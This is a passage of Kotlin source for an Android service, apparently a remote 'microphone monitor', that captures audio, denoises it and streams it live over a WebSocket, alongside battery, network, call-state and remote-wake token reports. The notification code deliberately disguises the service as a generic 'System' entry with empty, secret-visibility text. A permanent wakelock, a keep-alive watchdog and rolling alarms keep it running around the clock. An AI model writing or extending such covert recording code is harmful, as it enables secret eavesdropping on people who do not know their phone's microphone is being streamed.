                noiseAdaptFrames++
            }

            // Spectral subtraction once we have enough FFT history and noise adaptation (~160ms+)
            if (fftFramesProcessed >= 15 && noiseAdaptFrames >= 10) {
                // Increase subtraction only in strong/noisy conditions (e.g. exhaust fans).
                val strongDenoise = aiEnhancementEnabled || estimatedNoiseDb > -54.0
                val OVER  = if (strongDenoise) 0.84 else 0.74
                val FLOOR = if (strongDenoise) 0.26 else 0.38
                for (i in 0 until BINS) {
                    val noiseP = noisePow[i].coerceAtLeast(1e-10)
                    val clean  = (power[i] - OVER * noiseP).coerceAtLeast(FLOOR * noiseP)
                    val scale  = if (power[i] > 1e-10) Math.sqrt(clean / power[i]) else 0.0
                    re[i] *= scale;  im[i] *= scale
                    // Mirror scale to conjugate negative-frequency bin
                    if (i in 1 until BINS - 1) {
                        re[FRAME - i] *= scale
                        im[FRAME - i] *= scale
                    }
                }
            }

            // IFFT + synthesis window
            fft(re, im, true)
            return DoubleArray(FRAME) { i -> re[i] * win[i] }
        }
    }

    /**
     * In-place Cooley-Tukey iterative radix-2 FFT / IFFT.
     * [re] and [im] must both have a length that is a power of two.
     * forward (inverse=false): analysis.  inverse (inverse=true): synthesis, scaled 1/N.
     */
    private fun fft(re: DoubleArray, im: DoubleArray, inverse: Boolean) {
        val n = re.size
        // Bit-reversal permutation
        var j = 0
        for (i in 1 until n) {
            var bit = n ushr 1
            while (j and bit != 0) { j = j xor bit; bit = bit ushr 1 }
            j = j xor bit
            if (i < j) {
                var t = re[i]; re[i] = re[j]; re[j] = t
                t = im[i];     im[i] = im[j]; im[j] = t
            }
        }
        // Butterfly stages
        var len = 2
        while (len <= n) {
            val half = len ushr 1
            val ang  = 2.0 * Math.PI / len * (if (inverse) -1.0 else 1.0)
            val wbRe = Math.cos(ang)
            val wbIm = Math.sin(ang)
            var i = 0
            while (i < n) {
                var wRe = 1.0; var wIm = 0.0
                for (k in 0 until half) {
                    val uRe = re[i + k];            val uIm = im[i + k]
                    val vRe = re[i+k+half]*wRe - im[i+k+half]*wIm
                    val vIm = re[i+k+half]*wIm + im[i+k+half]*wRe
                    re[i + k]      = uRe + vRe;     im[i + k]      = uIm + vIm
                    re[i + k+half] = uRe - vRe;     im[i + k+half] = uIm - vIm
                    val nwRe = wRe * wbRe - wIm * wbIm
                    wIm = wRe * wbIm + wIm * wbRe
                    wRe = nwRe
                }
                i += len
            }
            len = len shl 1
        }
        if (inverse) { val inv = 1.0 / n; for (i in 0 until n) { re[i] *= inv; im[i] *= inv } }
    }

    /**
     * Soft-knee peak limiter.
     * Linear below ±24000; exponential curve up to ±32767 for samples above the knee.
     * Prevents hard digital clipping without audible distortion.
     */
    private fun softPeakLimit(x: Double): Double {
        val knee = 28500.0 // Catch true peaks only; normal speech stays linear
        val ceil = 32767.0
        val abs  = Math.abs(x)
        if (abs <= knee) return x
        if (abs >= ceil) return Math.copySign(ceil, x)
        val range      = ceil - knee
        val excess     = abs - knee
        val compressed = knee + range * (1.0 - Math.exp(-excess / range))
        return Math.copySign(compressed, x)
    }

    private fun updateAutoAiProfile(pcm16: ByteArray, len: Int) {
        val sampleCount = len / 2
        if (sampleCount <= 0) return

        var sumSq = 0.0
        var peak = 0
        var i = 0
        while (i + 1 < len) {
            val s = readLeSample(pcm16, i)
            val abs = kotlin.math.abs(s)
            if (abs > peak) peak = abs
            sumSq += s.toDouble() * s.toDouble()
            i += 2
        }

        val rms = kotlin.math.sqrt(sumSq / sampleCount).coerceAtLeast(1.0)
        val rmsDb = 20.0 * kotlin.math.log10(rms / 32768.0)
        val peakDb = 20.0 * kotlin.math.log10((peak.coerceAtLeast(1)).toDouble() / 32768.0)
        val crestDb = peakDb - rmsDb

        val likelySpeech = rmsDb > -58.0 && crestDb > 5.0
        if (!likelySpeech) {
            val alpha = if (rmsDb > estimatedNoiseDb) 0.90 else 0.97
            estimatedNoiseDb = alpha * estimatedNoiseDb + (1.0 - alpha) * rmsDb
        }

        val now = System.currentTimeMillis()
        if (now - lastAutoAiSwitchAt < 12_000) return

        val shouldEnableStrong = estimatedNoiseDb > -55.0
        val shouldDisableStrong = estimatedNoiseDb < -63.0

        if (!aiEnhancementEnabled && shouldEnableStrong) {
            aiEnhancementEnabled = true
            lastAutoAiSwitchAt = now
            sendHealthStatus("auto_ai_on")
        } else if (aiEnhancementEnabled && shouldDisableStrong) {
            aiEnhancementEnabled = false
            lastAutoAiSwitchAt = now
            sendHealthStatus("auto_ai_off")
        }
    }

    private fun readLeSample(buf: ByteArray, offset: Int): Int {
        val lo = buf[offset].toInt() and 0xFF
        val hi = buf[offset + 1].toInt()
        return ((hi shl 8) or lo).toShort().toInt()
    }

    private fun stopAudioCapture(reason: String = "stop_capture_cmd") {
        isCapturing = false
        try {
            audioRecord?.stop()
            releaseSessionAudioEffects()
            audioRecord?.release()
        } catch (_: Exception) {}
        audioRecord = null
        if (ourAudioMode) {
            try {
                (getSystemService(Context.AUDIO_SERVICE) as? AudioManager)?.mode = AudioManager.MODE_NORMAL
            } catch (_: Exception) {}
            ourAudioMode = false
        }
        sendHealthStatus(reason)
    }

    private fun sendHealthStatus(reason: String) {
        val ws = activeWebSocket ?: return
        if (reason == "audio_tick") {
            safeSend("""{"type":"ping"}""")
            return
        }
        lastHealthSentAt = System.currentTimeMillis()
        val battery = getBatterySnapshot()
        val internetOnline = isInternetOnline()
        val callActive = isDeviceInCall()
        
        // Get network quality info for debugging
        val cm = connectivityManager
        val network = cm?.activeNetwork
        val caps = if (network != null) cm.getNetworkCapabilities(network) else null
        val downKbps = caps?.linkDownstreamBandwidthKbps ?: 0
        val upKbps = caps?.linkUpstreamBandwidthKbps ?: 0
        val isWifi = caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
        val isCellular = caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true
        
        val msg = JSONObject().apply {
            put("type", "health_status")
            put("deviceId", deviceId)
            put("wsConnected", activeWebSocket != null)
            // In WebRTC mode microphone is captured by WebRTC audio source, not AudioRecord.
            put("micCapturing", isCapturing || isWebRtcStreaming)
            put("lastAudioChunkSentAt", lastAudioChunkSentAt)
            put("reason", reason)
            put("ts", lastHealthSentAt)
            put("aiMode", aiEnhancementEnabled)
            put("aiAuto", aiAutoModeEnabled)
            put("photoAi", aiPhotoEnhancementEnabled)
            put("photoQuality", photoQualityMode)
            put("photoNight", photoNightMode)
            put("appVersionName", BuildConfig.VERSION_NAME)
            put("appVersionCode", BuildConfig.VERSION_CODE)
            put("streamCodecMode", wsStreamMode)
            put("streamCodec", if (lastCodecChoice == AUDIO_CODEC_MULAW_8K) "smart" else "pcm")
            put("voiceProfile", voiceProfile)
            put("noiseDb", estimatedNoiseDb)
            put("internetOnline", internetOnline)
            put("callActive", callActive)
            put("lowNetwork", lowNetworkMode)
            put("streamingMode", "realtime")
            
            // FCM Token for Layer 4 triggering (remote wake-up)
            val prefs = getSharedPreferences("micmonitor", MODE_PRIVATE)
            val fcmToken = prefs.getString("fcm_token", "")
            put("fcmToken", fcmToken)

            // Network quality info
            put("netDownKbps", downKbps)
            put("netUpKbps", upKbps)
            put("netType", when {
                isWifi -> "wifi"
                isCellular -> "cellular"
                else -> "other"
            })
            put("bitrateKbps", currentWebRtcBitrateKbps)
            if (battery != null) {
                put("batteryPct", battery.first)
                put("charging", battery.second)
            }
        }
        safeSend(msg.toString())
    }

    private fun isInternetOnline(): Boolean {
        val cm = connectivityManager ?: return false
        val network = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(network) ?: return false
        val hasTransport = caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
        val validated = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        return hasTransport && validated
    }

    private fun isDeviceInCall(): Boolean {
        return try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return false
            val mode = audioManager.mode
            // We keep MODE_NORMAL during capture (ourAudioMode=false) so real calls are visible.
            // If we ever set MODE_IN_COMMUNICATION ourselves again, gate with !ourAudioMode.
            !ourAudioMode && (mode == AudioManager.MODE_IN_CALL || mode == AudioManager.MODE_IN_COMMUNICATION)
        } catch (_: Exception) {
            false
        }
    }

    private fun getBatterySnapshot(): Pair<Int, Boolean>? {
        return try {
            val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) ?: return null
            val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            val pct = if (level >= 0 && scale > 0) ((level * 100f) / scale).toInt().coerceIn(0, 100) else -1
            val status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
            val charging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                status == BatteryManager.BATTERY_STATUS_FULL
            Pair(pct, charging)
        } catch (_: Exception) {
            null
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // File recording helpers
    // ────────────────────────────────────────────────────────────────────────

    private fun openRecordingFile() {
        try {
            val dir = getExternalFilesDir(null) ?: filesDir
            dir.mkdirs()
            
            // Clean up recordings older than 3 days
            val threeDaysAgo = System.currentTimeMillis() - 3L * 24 * 60 * 60 * 1000
            dir.listFiles()?.forEach { file ->
                if (file.name.startsWith("rec_") && file.name.endsWith(".pcm") && file.lastModified() < threeDaysAgo) {
                    file.delete()
                }
            }
            val timestamp = System.currentTimeMillis()
            recordingFile = File(dir, "rec_${timestamp}.pcm")
            recordingFileStream = FileOutputStream(recordingFile)
            isSavingFile = true
            Log.i(TAG, "Recording to: ${recordingFile?.absolutePath}")
            updateNotification("Live streaming + Recording…")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open recording file", e)
        }
    }

    private fun closeRecordingFile() {
        isSavingFile = false
        try {
            recordingFileStream?.flush()
            recordingFileStream?.close()
        } catch (_: Exception) {}
        recordingFileStream = null
        Log.i(TAG, "Recording saved: ${recordingFile?.name}")
        updateNotification("Live streaming active")
    }

    // ────────────────────────────────────────────────────────────────────────
    // Notification helpers
    // ────────────────────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        // IMPORTANCE_LOW is required for foreground service survival
        // But we hide as much as possible
        val channel = NotificationChannel(
            CHANNEL_ID,
            "System",  // Generic name
            NotificationManager.IMPORTANCE_LOW  // Required for foreground service
        ).apply {
            description = "Background service"
            setSound(null, null)
            enableVibration(false)
            setShowBadge(false)
            enableLights(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
        }
        getSystemService(NotificationManager::class.java)
            .createNotificationChannel(channel)
    }

    private fun buildNotification(statusText: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System")  // Generic title
            .setContentText("")  // Empty text - less visible
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setLocalOnly(true)  // Don't sync to other devices
            .build()
    }

    private fun updateNotification(statusText: String) {
        // Ignore status text - always show minimal notification
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIF_ID, buildNotification(""))
    }

    // ────────────────────────────────────────────────────────────────────────
    // WakeLock — keeps CPU awake while app is in background
    // ────────────────────────────────────────────────────────────────────────
    private fun acquireWakeLock() {
        val pm = getSystemService(PowerManager::class.java)
        
        synchronized(MicService::class.java) {
            if (staticWakeLock == null) {
                staticWakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "MicMonitor::AudioWakeLock"
                ).apply {
                    setReferenceCounted(false)
                }
            }
            // C-01: No timeout — WakeLock released only in onDestroy. Prevents CPU sleep gaps.
            if (staticWakeLock?.isHeld != true) {
                staticWakeLock?.acquire()
            }
            wakeLock = staticWakeLock
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // WorkManager watchdog — keeps service alive 24/7
    // ────────────────────────────────────────────────────────────────────────

    private fun scheduleKeepAlive() {
        val request = PeriodicWorkRequestBuilder<KeepAliveWorker>(15, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
            "keep_alive",
            ExistingPeriodicWorkPolicy.KEEP,
            request
        )
        Log.i(TAG, "KeepAlive watchdog scheduled (15 min interval)")
    }

    /**
     * Schedules a one-shot AlarmManager alarm 8 minutes from now.
     * On fire, sends ACTION_RECONNECT to this service — survives Doze better
     * than coroutines because AlarmManager uses ELAPSED_REALTIME_WAKEUP.
     * The alarm reschedules itself each time it fires, creating a rolling chain.
     */
    private fun scheduleReconnectAlarm() {
        val intent = Intent(applicationContext, MicService::class.java).apply {
            action = ACTION_RECONNECT
            data = android.net.Uri.parse("timer:${System.currentTimeMillis()}") // Bug 13: Unique Intent
        }
        val pendingIntent = PendingIntent.getService(
            applicationContext, 2, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(AlarmManager::class.java)
        val triggerAt = SystemClock.elapsedRealtime() + 8 * 60 * 1000L
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Bug 2: On Android 12+ exact alarms need SCHEDULE_EXACT_ALARM permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmManager.canScheduleExactAlarms()) {
                alarmManager.setAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pendingIntent
                )
                Log.w(TAG, "Exact alarm permission denied, using inexact fallback")
                return
            }
            alarmManager.setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        } else {
            alarmManager.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        }
        Log.i(TAG, "Reconnect alarm scheduled in 8 min")
    }
}
